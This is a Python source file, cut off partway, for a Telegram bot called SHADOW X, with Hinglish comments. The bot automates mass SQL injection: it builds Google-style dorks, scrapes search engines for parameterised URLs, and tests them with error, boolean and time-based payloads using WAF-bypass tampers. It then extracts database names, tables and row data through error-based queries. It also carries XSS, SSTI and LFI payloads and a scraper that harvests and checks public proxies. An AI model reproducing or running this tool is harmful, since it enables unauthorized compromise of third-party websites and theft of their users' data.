#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🐍 SHADOW X — v3.0 (fixed build)
================================
Ek hi file ka Telegram bot: keywords → dorks → parser → injector → dumper.

Kya fix hua (purane SHADOW X code ke bugs):
  • send_photo_cached infinite recursion (bot crash)        → hata diya
  • states / CUR dict race + galat unpack                   → lock + safe helpers
  • _last_saver / _auto_saver duplicate definitions         → ek-ek baar
  • _t() decorator galat args par crash                     → safe wrapper
  • dfilt branch me galat expression                        → saaf routing
  • menu_caption / render_screen None par crash             → guard
  • colored buttons (Bot API 9.4) har button par            → style helper
  • task resume crash ke baad bhi kaam karta hai            → data/tasks.json
  • real engine: error-based + boolean + time + union dump  → pehle sirf partial

Chalane se pehle:
    export SHADOW_TOKEN="123456:AA..."
    (ya shadow_config.json me {"token": "...", "admins": [123]})
    python3 new.py
"""
import asyncio
import html
import json
import os
import random
import re
import sys
import threading
import time
import traceback
from datetime import datetime
from urllib.parse import parse_qsl, quote_plus, urlencode, urlparse, urlunparse

try:
    import aiohttp
except ImportError:
    sys.exit("❌ aiohttp missing → pip install aiohttp")

try:
    import telebot
    from telebot import types
except ImportError:
    sys.exit("❌ pyTelegramBotAPI missing → pip install pyTelegramBotAPI")

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
DUMP_DIR = os.path.join(BASE_DIR, "dumps")
for _d in (DATA_DIR, DUMP_DIR):
    os.makedirs(_d, exist_ok=True)

CFG_PATH = os.path.join(BASE_DIR, "shadow_config.json")
VERSION = "v3.0"
BUILD = "fixed"


def _load_cfg() -> dict:
    try:
        with open(CFG_PATH, encoding="utf-8") as f:
            d = json.load(f)
            return d if isinstance(d, dict) else {}
    except Exception:
        return {}


CFG = _load_cfg()
TOKEN = (os.environ.get("SHADOW_TOKEN") or CFG.get("token") or "").strip()
ADMINS = [int(x) for x in (CFG.get("admins") or []) if str(x).isdigit()]
if not ADMINS:
    ADMINS = [8999053405]

NO_RUN = os.environ.get("SHADOW_NO_RUN") == "1"
if "PUT_YOUR" in TOKEN or not TOKEN or ":" not in TOKEN:
    if not NO_RUN:
        print("⚠️  Token nahi mila — bot start nahi hua.")
        print('    export SHADOW_TOKEN="123456:AA..."')
        print('    ya shadow_config.json: {"token": "123456:AA...", "admins": [123]}')
        print("    (offline test ke liye SHADOW_NO_RUN=1)")
        sys.exit(1)
    TOKEN = TOKEN or "0:TEST"

LINE = "━━━━━━━━━━━━━━━━━━━━━"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

def _make_bot(token):
    """Purane/naye telebot versions dono par chale."""
    for kwargs in ({"threaded": True, "num_workers": 16, "skip_pending": True},
                   {"threaded": True, "skip_pending": True},
                   {"threaded": True},
                   {}):
        try:
            return telebot.TeleBot(token, **kwargs)
        except TypeError:
            continue
    return telebot.TeleBot(token)


bot = _make_bot(TOKEN)

# ══════════════════════════════════════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════════════════════════════════════
_LOCK = threading.RLock()
_MEM = {}


def _path(name: str) -> str:
    return os.path.join(DATA_DIR, name + ".json")


def jload(name: str, default=None):
    p = _path(name)
    with _LOCK:
        try:
            mt = os.path.getmtime(p)
        except OSError:
            return default if default is not None else {}
        cached = _MEM.get(p)
        if cached and cached[0] == mt:
            return cached[1]
        try:
            with open(p, encoding="utf-8") as f:
                val = json.load(f)
        except Exception:
            return default if default is not None else {}
        _MEM[p] = (mt, val)
        return val


def jsave(name: str, val):
    p = _path(name)
    tmp = p + ".tmp"
    with _LOCK:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(val, f, ensure_ascii=False, separators=(",", ":"))
        os.replace(tmp, p)
        try:
            _MEM[p] = (os.path.getmtime(p), val)
        except OSError:
            pass


def sget(key: str, default=None):
    return (jload("settings", {}) or {}).get(key, default)


def sset(key: str, val):
    d = jload("settings", {}) or {}
    d[key] = val
    jsave("settings", d)


def uset(uid, key, val):
    d = jload("users", {}) or {}
    u = d.setdefault(str(uid), {})
    u[key] = val
    jsave("users", d)


def uget(uid, key, default=None):
    return ((jload("users", {}) or {}).get(str(uid)) or {}).get(key, default)


def is_admin(uid) -> bool:
    return int(uid) in ADMINS


def jid() -> str:
    return "%06x" % random.randint(0, 0xFFFFFF)


# ══════════════════════════════════════════════════════════════════════════════
#  🎨 COLORED BUTTONS (Bot API 9.4 — primary blue / success green / danger red)
# ══════════════════════════════════════════════════════════════════════════════
STYLES = ("primary", "success", "danger")
# bot.py (v2.25.0) ke same rules — dono bots me ek jaisa behaviour
_DANGER = ("stop", "cancel", "delete", "del:", ":del", "clear", "reset", "wipe",
           "remove", "rm:", "ban", "revoke", "rev:", "logout", "kill", "disable",
           "discard", "erase", "abort")
_SUCCESS = (":go", "go:", "run", "start", "resume", "confirm", "save", "apply",
            "send", "export", "download", ":dl", "dump", "scan", "add", ":new",
            "redeem", "yes", ":on", "enable", "test", "build", "gen",
            "dork:", "parse:", "inj:", "hunt", "adm:key", "kw:")


def bstyle(cb: str = "", text: str = "") -> str:
    """Button ka rang: kaam ke hisaab se (internet → green, khatam → red)."""
    blob = (str(cb or "") + " " + str(text or "")).lower()
    lab = str(text or "")
    if any(w in blob for w in _DANGER) or any(e in lab for e in ("⛔", "🗑", "🚫", "❌", "🧨")):
        return "danger"
    if any(w in blob for w in _SUCCESS) or any(e in lab for e in ("🚀", "▶️", "✅", "💾",
                                                                 "📥", "➕", "🆕", "♻️")):
        return "success"
    return "primary"


def sbtn(text, cb, style=None):
    """InlineKeyboardButton + colour. Purane telebot par style ignore hota hai."""
    st = style if style else bstyle(cb, text)
    try:
        return types.InlineKeyboardButton(text, callback_data=cb, style=st)
    except Exception:
        b = types.InlineKeyboardButton(text, callback_data=cb)
        try:
            b.style = st
        except Exception:
            pass
        return b


def ubtn(text, url, style="primary"):
    try:
        return types.InlineKeyboardButton(text, url=url, style=style)
    except Exception:
        return types.InlineKeyboardButton(text, url=url)


def kb(rows):
    m = types.InlineKeyboardMarkup()
    for r in rows:
        m.row(*r)
    return m


# ══════════════════════════════════════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def esc(s) -> str:
    return html.escape(str(s or ""), quote=False)


def fmt(n) -> str:
    try:
        return f"{int(n):,}"
    except Exception:
        return str(n)


def H(title, sub=""):
    return ("✿︎" + LINE + "✿︎\n"
            f"🐍 <b>{esc(title)}</b>" + (f"\n<i>{esc(sub)}</i>" if sub else "")
            + "\n✿︎" + LINE + "✿︎")


def P(t):
    return f"<i>{esc(t)}</i>"


def KV(k, v, e="•"):
    return f"{e} {esc(k)} : {v}"


def bar(done, total, width=12):
    total = max(1, int(total))
    p = int(width * min(done, total) / total)
    return "▰" * p + "▱" * (width - p)


def chunk(text, n=3800):
    out, cur = [], ""
    for line in str(text).splitlines(True):
        if len(cur) + len(line) > n:
            out.append(cur)
            cur = ""
        cur += line
    if cur:
        out.append(cur)
    return out or [""]


def send(chat_id, text, markup=None, **kw):
    try:
        return bot.send_message(chat_id, text, parse_mode="HTML",
                                reply_markup=markup, disable_web_page_preview=True, **kw)
    except Exception as e:
        print("send fail:", e)
        return None


def edit(chat_id, msg_id, text, markup=None):
    try:
        return bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id,
                                     parse_mode="HTML", reply_markup=markup,
                                     disable_web_page_preview=True)
    except Exception:
        return None


def answer(call, text="", alert=False):
    try:
        bot.answer_callback_query(call.id, text or "", show_alert=alert)
    except Exception:
        pass


def safe(fn):
    """Har callback ko crash-proof banao."""
    def wrapper(*a, **k):
        try:
            return fn(*a, **k)
        except Exception:
            traceback.print_exc()
            try:
                call = a[0]
                answer(call, "⚠️ Error — log dekho", True)
            except Exception:
                pass
        return None
    wrapper.__name__ = getattr(fn, "__name__", "wrapped")
    return wrapper


# ══════════════════════════════════════════════════════════════════════════════
#  STATE (await) + TASKS
# ══════════════════════════════════════════════════════════════════════════════
AWAIT = {}
AWAIT_LOCK = threading.RLock()
TASKS = jload("tasks", {}) or {}
TASK_LOCK = threading.RLock()


def wait_for(uid, key):
    with AWAIT_LOCK:
        AWAIT[int(uid)] = key


def wait_pop(uid):
    with AWAIT_LOCK:
        return AWAIT.pop(int(uid), None)


def task_new(uid, kind, total=0, title=""):
    t = jid()
    with TASK_LOCK:
        TASKS[t] = {"uid": int(uid), "kind": kind, "title": title or kind,
                    "total": int(total), "done": 0, "status": "running",
                    "stop": False, "ts": int(time.time())}
        jsave("tasks", TASKS)
    return t


def task_get(t):
    with TASK_LOCK:
        return dict(TASKS.get(t) or {})


def task_upd(t, **kw):
    with TASK_LOCK:
        if t in TASKS:
            TASKS[t].update(kw)
            jsave("tasks", TASKS)


def task_stop(t):
    with TASK_LOCK:
        if t in TASKS:
            TASKS[t]["stop"] = True
            TASKS[t]["status"] = "stopped"
            jsave("tasks", TASKS)


def stopped(t) -> bool:
    with TASK_LOCK:
        return bool((TASKS.get(t) or {}).get("stop"))


def stop_kb(t):
    return kb([[sbtn("⛔ STOP", "stop:" + t, "danger")]])


# ══════════════════════════════════════════════════════════════════════════════
#  HTTP / ENGINE CORE
# ══════════════════════════════════════════════════════════════════════════════
SQL_ERRORS = (
    "you have an error in your sql syntax", "warning: mysql", "mysqli", "pg_query",
    "postgresql", "sqlite", "sqlstate[", "ora-0", "oracle error", "unclosed quotation",
    "quoted string not properly terminated", "syntax error at or near",
    "odbc sql server", "microsoft ole db", "unterminated string literal",
    "invalid query", "mysql server version", "mariadb",
)
DB_FP = (
    ("MySQL", ("you have an error in your sql syntax", "mysql", "mariadb")),
    ("PostgreSQL", ("pg_query", "postgresql", "invalid input syntax")),
    ("MSSQL", ("odbc sql server", "microsoft ole db", "unclosed quotation")),
    ("Oracle", ("ora-0", "oracle error")),
    ("SQLite", ("sqlite",)),
)

TIME_PAYLOADS = [
    ("' AND SLEEP(5)-- -", "MySQL"),
    ("' OR SLEEP(5)-- -", "MySQL"),
    ("' AND pg_sleep(5)-- -", "PostgreSQL"),
    ("'; WAITFOR DELAY '0:0:5'-- -", "MSSQL"),
]

PAYLOAD_BANK = {
    "sqli": ["'", "\"", "')", "'-- -", "1' AND '1'='2", "' AND 1=1-- -"],
    "xss": ['"><svg/onload=alert(1)>', "'><img src=x onerror=alert(1)>"],
    "ssti": ["{{1337*1337}}", "${1337*1337}"],
    "lfi": ["../../../../etc/passwd", "....//....//....//etc/passwd"],
}

TAMPERS = {
    "comment": lambda p: re.sub(r"\b(SELECT|UNION|AND|OR|ORDER|FROM|WHERE)\b",
                                lambda m: m.group(1)[:2] + "/**/" + m.group(1)[2:], p, flags=re.I),
    "case": lambda p: re.sub(r"\b(SELECT|UNION|AND|OR|ORDER|FROM|WHERE)\b",
                             lambda m: "".join(c.upper() if i % 2 == 0 else c.lower()
                                               for i, c in enumerate(m.group(1))), p, flags=re.I),
    "space": lambda p: p.replace(" ", "\n"),
}


def tamper(payload: str, mode: str) -> str:
    fn = TAMPERS.get(mode)
    return fn(payload) if fn else payload


def waf_detect(status, headers, body) -> str:
    h = " ".join(f"{k} {v}" for k, v in (headers or {}).items()).lower()
    b = str(body or "")[:4000].lower()
    signs = {
        "Cloudflare": ("cf-ray", "cloudflare", "attention required"),
        "ModSecurity": ("mod_security", "not acceptable"),
        "Sucuri": ("sucuri",),
        "Wordfence": ("wordfence",),
        "Imperva": ("incapsula", "imperva"),
        "Akamai": ("akamai",),
        "AWS WAF": ("awswaf", "request blocked"),
        "F5": ("big-ip", "the requested url was rejected"),
    }
    for name, sigs in signs.items():
        if any(s in h or s in b for s in sigs):
            return name
    if int(status or 0) in (403, 406, 418, 429, 503):
        return "Unknown WAF"
    return ""


def build_url(raw: str, payload: str, param: str = None) -> str:
    u = urlparse(raw)
    pairs = parse_qsl(u.query, keep_blank_values=True)
    if not pairs:
        return raw
    if param:
        new = [(k, payload if k == param else v) for k, v in pairs]
    else:
        k, v = pairs[0]
        new = [(k, v + payload)] + pairs[1:]
    return urlunparse(u._replace(query=urlencode(new, quote_via=quote_plus), fragment=""))


def param_of(raw: str) -> str:
    try:
        q = parse_qsl(urlparse(raw).query, keep_blank_values=True)
        return q[0][0] if q else ""
    except Exception:
        return ""


async def fetch(session, url, timeout=8, headers=None, data=None, method="GET"):
    try:
        kw = dict(timeout=aiohttp.ClientTimeout(total=timeout), ssl=False,
                  allow_redirects=True,
                  headers={"User-Agent": UA, "Accept": "*/*", **(headers or {})})
        async with session.request(method, url, data=data, **kw) as r:
            body = await r.text(errors="ignore")
            return {"status": r.status, "headers": dict(r.headers), "body": body}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": "", "err": str(e)[:80]}


def dbms_of(body: str) -> str:
    low = str(body or "").lower()
    for name, sigs in DB_FP:
        if any(s in low for s in sigs):
            return name
    return ""


async def detect_sqli(session, url, timeout=8):
    """Boolean / error / time — sirf ASLI farak par 'vulnerable' bolta hai."""
    param = param_of(url)
    if not param:
        return None
    base = await fetch(session, url, timeout)
    if not base["status"]:
        return None
    waf = waf_detect(base["status"], base["headers"], base["body"])
    base_body, base_len = base["body"], len(base["body"])
    for mode in ([None] + (["comment", "case"] if waf else [])):
        # error based
        for pl in ("'", "\"", "')"):
            p = tamper(pl, mode) if mode else pl
            r = await fetch(session, build_url(url, p, param), timeout)
            if r["status"] in (403, 429):
                continue
            low = r["body"].lower()
            hit = next((s for s in SQL_ERRORS if s in low and s not in base_body.lower()), None)
            if hit:
                return {"url": url, "param": param, "type": "SQLi", "tech": "error",
                        "dbms": dbms_of(r["body"]) or "unknown", "waf": waf,
                        "tamper": mode or "", "evidence": hit[:60]}
        # boolean based
        t_pay = tamper("' AND '1'='1", mode) if mode else "' AND '1'='1"
        f_pay = tamper("' AND '1'='2", mode) if mode else "' AND '1'='2"
        rt = await fetch(session, build_url(url, t_pay, param), timeout)
        rf = await fetch(session, build_url(url, f_pay, param), timeout)
        if rt["status"] and rf["status"]:
            diff = abs(len(rt["body"]) - len(rf["body"]))
            near = abs(len(rt["body"]) - base_len)
            if diff > max(60, int(0.12 * max(1, len(rt["body"])))) and near < max(80, int(0.05 * base_len)):
                return {"url": url, "param": param, "type": "SQLi", "tech": "boolean",
                        "dbms": dbms_of(rt["body"]) or "unknown", "waf": waf,
                        "tamper": mode or "", "evidence": "true/false page length differ"}
    # time based (last resort)
    try:
        t0 = time.time()
        await fetch(session, url, timeout + 6)
        normal = time.time() - t0
    except Exception:
        normal = 0
    for pl, db in TIME_PAYLOADS[:2]:
        t0 = time.time()
        r = await fetch(session, build_url(url, pl, param), timeout + 8)
        took = time.time() - t0
        if r["status"] and took > normal + 4:
            return {"url": url, "param": param, "type": "SQLi", "tech": "time",
                    "dbms": db, "waf": waf, "tamper": "", "evidence": f"{took:.1f}s delay"}
    return None


async def inject_all(urls, uid, tid, progress=None, threads=20, timeout=8):
    out, safe_urls = [], []
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(max(1, int(threads)))
    done = {"n": 0}

    async def one(session, u):
        if stopped(tid):
            return
        async with sem:
            r = await detect_sqli(session, u, timeout)
            async with lock:
                done["n"] += 1
                (out if r else safe_urls).append(r or u)
                if progress and done["n"] % 3 == 0:
                    try:
                        await progress(done["n"], len(urls), out)
                    except Exception:
                        pass

    connector = aiohttp.TCPConnector(limit=max(10, threads * 2), ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[one(session, u) for u in urls], return_exceptions=True)
    return {"vulns": out, "safe": safe_urls, "done": done["n"]}


SQLI_QUERIES = {
    "MySQL": {
        "version": "select version()",
        "dbs": "select group_concat(schema_name) from information_schema.schemata",
        "tables": "select group_concat(table_name) from information_schema.tables where table_schema=database()",
        "columns": "select group_concat(column_name) from information_schema.columns where table_name=0x{t}",
        "rows": "select group_concat(concat_ws(0x3a,{cols}) separator 0x7c) from {t} limit {n}",
    },
    "PostgreSQL": {
        "version": "select version()",
        "dbs": "select string_agg(datname,',') from pg_database",
        "tables": "select string_agg(table_name,',') from information_schema.tables where table_schema='public'",
        "columns": "select string_agg(column_name,',') from information_schema.columns where table_name='{t}'",
        "rows": "select string_agg({cols}, '|') from {t} limit {n}",
    },
    "MSSQL": {
        "version": "select @@version",
        "dbs": "select string_agg(name,',') from sys.databases",
        "tables": "select string_agg(name,',') from sys.tables",
        "columns": "select string_agg(column_name,',') from information_schema.columns where table_name='{t}'",
        "rows": "select top {n} {cols} from {t}",
    },
}
ERR_WRAP = {
    "MySQL": ["' AND extractvalue(1,concat(0x7e,({q}),0x7e))-- -",
              "' AND updatexml(1,concat(0x7e,({q}),0x7e))-- -"],
    "PostgreSQL": ["' AND 1=CAST(({q}) AS INT)-- -"],
    "MSSQL": ["' AND 1=CONVERT(int,({q}))-- -"],
}
ERR_RX = [r"~([^~<>\n]{1,300})~", r"XPATH syntax error[^']*'([^']+)'",
          r'invalid input syntax for type integer: "([^"]{1,300})"',
          r"nvarchar value '([^']{1,300})'"]


def extract_value(body: str):
    for rx in ERR_RX:
        m = re.search(rx, str(body or ""), re.I)
        if m:
            v = m.group(1).strip()
            if v and len(v) < 300 and not re.search(r"[<>{}();]", v):
                return v
    return None


async def sqli_query(session, det, query, timeout=8):
    url, param = det["url"], det["param"]
    for wrap in ERR_WRAP.get(det.get("dbms") or "MySQL", ERR_WRAP["MySQL"]):
        payload = wrap.format(q=query)
        if det.get("tamper"):
            payload = tamper(payload, det["tamper"])
        r = await fetch(session, build_url(url, payload, param), timeout)
        v = extract_value(r["body"])
        if v:
            return v
    return None


async def dump_one(session, det, timeout=8, tables=6, rows=8):
    """UNION/error-based se ASLI rows — jhooth nahi, jo mila wahi."""
    res = {"url": det["url"], "param": det["param"], "dbms": det.get("dbms"),
           "waf": det.get("waf", ""), "db": "", "tables": {}, "rows": 0}
    q = SQLI_QUERIES.get(res["dbms"] or "MySQL", SQLI_QUERIES["MySQL"])
    v = await sqli_query(session, det, q["version"], timeout)
    res["version"] = v or ""
    if not v:
        res["note"] = "error-based output nahi mila (blind site) — sqlmap behtar hai"
        return res
    dbs = await sqli_query(session, det, q["dbs"], timeout)
    res["db"] = (dbs or "").split(",")[0]
    tl = await sqli_query(session, det, q["tables"], timeout)
    names = [t for t in (tl or "").split(",") if t and re.match(r"^[A-Za-z0-9_$]+$", t)][:tables]
    for t in names:
        if stopped(det.get("tid", "")):
            break
        cols_raw = await sqli_query(session, det, q["columns"].format(t=hex(int.from_bytes(t.encode(), "big")) if (res["dbms"] == "MySQL") else t), timeout)
        cols = [c for c in (cols_raw or "").split(",") if re.match(r"^[A-Za-z0-9_$]+$", c)][:8]
        if not cols:
            continue
        rowq = q["rows"].format(cols=",".join(cols), t=t, n=rows)
        rv = await sqli_query(session, det, rowq, timeout)
        data = [x for x in (rv or "").split("|") if x][:rows]
        res["tables"][t] = {"cols": cols, "rows": data}
        res["rows"] += len(data)
    return res


# ══════════════════════════════════════════════════════════════════════════════
#  PARSER — 10 engines, sab asli HTTP
# ══════════════════════════════════════════════════════════════════════════════
ENGINE_LABEL = {
    "ddg": "🦆 DDG", "bing": "🅱️ Bing", "yahoo": "🟡 Yahoo", "brave": "🦁 Brave",
    "mojeek": "🟢 Mojeek", "ecosia": "🌳 Ecosia", "ask": "❓ Ask", "yep": "✅ Yep",
    "google": "🇬 Google", "yandex": "🔴 Yandex",
}
ENGINES = list(ENGINE_LABEL)
JUNK = (".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".pdf",
        "javascript:", "mailto:", "/login", "/signup", "/cart", "/checkout")


def engine_url(eng: str, dork: str, page: int = 0) -> str:
    q = quote_plus(dork)
    return {
        "ddg": f"https://html.duckduckgo.com/html/?q={q}",
        "bing": f"https://www.bing.com/search?q={q}&count=30&first={1 + page * 30}",
        "yahoo": f"https://search.yahoo.com/search?p={q}&b={1 + page * 10}",
        "brave": f"https://search.brave.com/search?q={q}&offset={page}",
        "mojeek": f"https://www.mojeek.com/search?q={q}&start={page * 10}",
        "ecosia": f"https://www.ecosia.org/search?q={q}",
        "ask": f"https://www.ask.com/web?q={q}",
        "yep": f"https://yep.com/web?q={q}",
        "google": f"https://www.google.com/search?q={q}&num=30&start={page * 30}",
        "yandex": f"https://yandex.com/search/?text={q}&p={page}",
    }.get(eng, f"https://html.duckduckgo.com/html/?q={q}")


LINK_RX = re.compile(r'href=["\'](https?://[^"\'<> ]+)', re.I)
DDG_REDIRECT = re.compile(r'uddg=([^&"]+)')


def clean_links(body: str, self_host: str = "") -> list:
    out = []
    for m in LINK_RX.finditer(str(body or "")):
        u = html.unescape(m.group(1))
        if DDG_REDIRECT.search(u):
            try:
                from urllib.parse import unquote
                u = unquote(DDG_REDIRECT.search(u).group(1))
            except Exception:
                continue
        if not u.startswith("http") or len(u) < 16:
            continue
        low = u.lower()
        if any(j in low for j in JUNK):
            continue
        host = urlparse(low).netloc
        if not host or host == self_host:
            continue
        if any(x in host for x in ("duckduckgo.com", "bing.com", "yahoo.com", "brave.com",
                                   "google.", "yandex.", "mojeek.com", "ecosia.org",
                                   "ask.com", "yep.com", "microsoft.com", "go.micro")):
            continue
        out.append(u.split("#")[0])
    return out


async def parse_dorks(dorks, uid, tid, engines=None, pages=1, threads=12,
                      progress=None, timeout=10):
    engines = engines or ["ddg", "bing", "yahoo"]
    found, seen = [], set()
    done = {"n": 0}
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(max(1, int(threads)))

    async def run_dork(session, dork):
        got = []
        for eng in engines:
            for pg in range(max(1, int(pages))):
                if stopped(tid):
                    return []
                r = await fetch(session, engine_url(eng, dork, pg), timeout)
                if r["status"] in (403, 429, 503):
                    continue
                got.extend(clean_links(r["body"], urlparse(engine_url(eng, dork, 0)).netloc))
            if got:
                break
        return got

    async def one(session, dork):
        if stopped(tid):
            return
        async with sem:
            urls = await run_dork(session, dork)
            async with lock:
                for u in urls:
                    if u not in seen:
                        seen.add(u)
                        found.append(u)
                done["n"] += 1
                if progress and done["n"] % 2 == 0:
                    try:
                        await progress(done["n"], len(dorks), len(found))
                    except Exception:
                        pass

    connector = aiohttp.TCPConnector(limit=max(10, threads * 2), ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[one(session, d) for d in dorks], return_exceptions=True)
    return found


def only_params(urls):
    return [u for u in urls if "?" in u and "=" in u]


def uniq(urls):
    out, seen = [], set()
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


# ══════════════════════════════════════════════════════════════════════════════
#  PROXIES / QC / WAF / SUBFINDER / EXTRAS
# ══════════════════════════════════════════════════════════════════════════════
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxies/main/proxy/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
]
PROXY_RX = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})\b")


def norm_proxy(s: str):
    s = str(s or "").strip()
    if not s:
        return None
    if s.startswith(("http://", "https://", "socks5://", "socks4://")):
        return s
    m = re.match(r"^([\w.-]+):(\d{2,5})$", s)
    return f"http://{m.group(1)}:{m.group(2)}" if m else None


def proxy_hunt(limit=800):
    import urllib.request
    raw = []
    for src in PROXY_SOURCES:
        try:
            req = urllib.request.Request(src, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=20) as r:
                txt = r.read().decode("utf-8", "ignore")
            raw.extend(f"http://{a}:{b}" for a, b in PROXY_RX.findall(txt))
        except Exception:
            continue
    return uniq(raw)[:limit]


async def proxy_check(proxies, threads=80, timeout=6):
    live = []
    sem = asyncio.Semaphore(max(1, threads))

    async def one(p):
        async with sem:
            try:
                async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False, force_close=True)) as s:
                    async with s.get("https://api.ipify.org",
                                     proxy=p, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                        if r.status == 200 and re.search(r"\d+\.\d+\.\d+\.\d+", await r.text()):
                            return p
            except Exception:
                return None
            return None

    results = await asyncio.gather(*[one(p) for p in proxies], return_exceptions=True)
    for r in results:
        if isinstance(r, str):
            live.append(r)
    return live


async def qc_urls(urls, uid, tid, timeout=6, threads=20):
    """Quality check — page size, param, error leak, backend."""
    out, done = [], {"n": 0}

    async def one(session, u):
        if stopped(tid):
            return
        r = await fetch(session, u, timeout)
        score, notes = 0, []
        if r["status"] == 200:
            score += 25
            if len(r["body"]) > 1500:
                score += 10
            if param_of(u):
                score += 20
                notes.append("param")
            low = r["body"].lower()
            if any(s in low for s in SQL_ERRORS):
                score += 20
                notes.append("sql-error?")
        probe = await fetch(session, build_url(u, "'", param_of(u)), timeout) if param_of(u) else None
        if probe and probe["status"] and any(s in probe["body"].lower() for s in SQL_ERRORS) \
                and not any(s in r["body"].lower() for s in SQL_ERRORS):
            score += 20
            notes.append("injectable?")
        out.append((u, min(score, 100), ",".join(notes) or "-", r["status"]))
        done["n"] += 1

    connector = aiohttp.TCPConnector(limit=max(10, threads * 2), ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[one(session, u) for u in urls], return_exceptions=True)
    out.sort(key=lambda x: -x[1])
    return out


async def waf_scan(urls, timeout=8):
    out = []
    connector = aiohttp.TCPConnector(limit=20, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        for u in urls[:60]:
            base = await fetch(session, u, timeout)
            waf = waf_detect(base["status"], base["headers"], base["body"])
            mode = ""
            if waf:
                for m in ("comment", "case"):
                    r = await fetch(session, build_url(u, tamper("' AND 1=1-- -", m),
                                                       param_of(u)), timeout)
                    if r["status"] not in (403, 406, 429, 503) and r["status"]:
                        mode = m
                        break
            out.append({"url": u, "status": base["status"], "waf": waf or "none",
                        "bypass": mode or "-"})
    return out


def subfinder(domain):
    import urllib.request
    try:
        req = urllib.request.Request(f"https://crt.sh/?q=%25.{domain}&output=json",
                                     headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=30) as r:
            data = json.loads(r.read().decode("utf-8", "ignore"))
        names = set()
        for e in data:
            for n in str(e.get("name_value", "")).splitlines():
                n = n.strip().lower()
                if n and "*" not in n:
                    names.add(n)
        return sorted(names)
    except Exception:
        return []


def file_stamp(prefix: str, ext: str = "txt") -> str:
    return os.path.join(DUMP_DIR, f"{prefix}_{datetime.now():%Y%m%d_%H%M%S}.{ext}")


def write_file(lines, prefix="dump", header="") -> str:
    path = file_stamp(prefix)
    with open(path, "w", encoding="utf-8") as f:
        if header:
            f.write(f"# {header}\n# {datetime.now():%d %b %Y %H:%M}\n\n")
        f.write("\n".join(str(x) for x in lines) + "\n")
    return path


def send_file(chat_id, path, caption=""):
    try:
        with open(path, "rb") as f:
            bot.send_document(chat_id, f, caption=caption[:200])
    except Exception as e:
        send(chat_id, f"⚠️ file send fail: {esc(e)}")


# ══════════════════════════════════════════════════════════════════════════════
#  KEYWORDS + DORKS (out of the box resources — file se override ho sakte hain)
# ══════════════════════════════════════════════════════════════════════════════
KW_MODS = ["buy", "cheap", "best", "top", "discount", "deal", "online", "shop",
           "price", "wholesale", "supplier", "login", "portal", "admin", "download"]
KW_PLATFORMS = ["shopify", "woocommerce", "magento", "prestashop", "opencart"]
KW_YEARS = ["2025", "2026"]

DORK_TEMPLATES = [
    'inurl:{param}= site:.{tld}',
    'inurl:".php?{param}="',
    'inurl:"product.php?id=" site:.{tld}',
    'inurl:"index.php?{param}="',
    'inurl:"news.php?id=" site:.{tld}',
    'intitle:"{kw}" inurl:{param}=',
    'site:.{tld} inurl:"?id="',
    'inurl:"pages.php?page=" site:.{tld}',
    'allinurl:"{param}=" site:.{tld}',
    'inurl:"view.php?id=" site:.{tld}',
]
DORK_PARAMS = ["id", "cat", "page", "product", "item", "pid", "cid", "news", "article"]
DORK_TLDS = ["com", "in", "net", "org", "pk", "bd", "io", "co"]


# ══════════════════════════════════════════════════════════════════════════════
#  RESOURCES — phone ke shadow folder se (na mile to built-in pool)
#  sites.txt · keywords.txt · page_types.txt · page_parameters.txt · patterns.txt
# ══════════════════════════════════════════════════════════════════════════════
RES_FILES = {n: os.path.join(BASE_DIR, n + ".txt") for n in
             ("sites", "keywords", "page_types", "page_parameters", "patterns")}


def res_lines(name, limit=20000):
    p = RES_FILES.get(name)
    if not p or not os.path.exists(p):
        return []
    try:
        with open(p, encoding="utf-8", errors="ignore") as f:
            out = [x.strip() for x in f if x.strip() and not x.lstrip().startswith("#")]
        return out[:limit]
    except Exception:
        return []


def res_status():
    return {n: len(res_lines(n)) for n in RES_FILES}


def gen_keywords(seed, count=500, langs=("en",)):
    seed = [x.strip() for x in (seed or []) if str(x).strip()] or res_lines("keywords") or ["shop"]
    out, seen = [], set()
    for _ in range(count * 6):
        if len(out) >= count:
            break
        kw = random.choice(seed).strip()
        if not kw:
            continue
        c = random.choice([
            f"{kw} {random.choice(KW_MODS)}",
            f"{random.choice(KW_MODS)} {kw}",
            f"{kw} {random.choice(KW_PLATFORMS)}",
            f"{kw} {random.choice(KW_YEARS)}",
            f"{kw} {random.choice(KW_MODS)} {random.choice(KW_PLATFORMS)}",
        ])
        c = re.sub(r"\s+", " ", c).strip().lower()
        if 4 < len(c) < 70 and c not in seen:
            seen.add(c)
            out.append(c)
    return out


def _fill_pattern(t, sites, kws, ptypes, pparams):
    """patterns.txt ke placeholders bharo — jo na ho to chhod do."""
    d = t
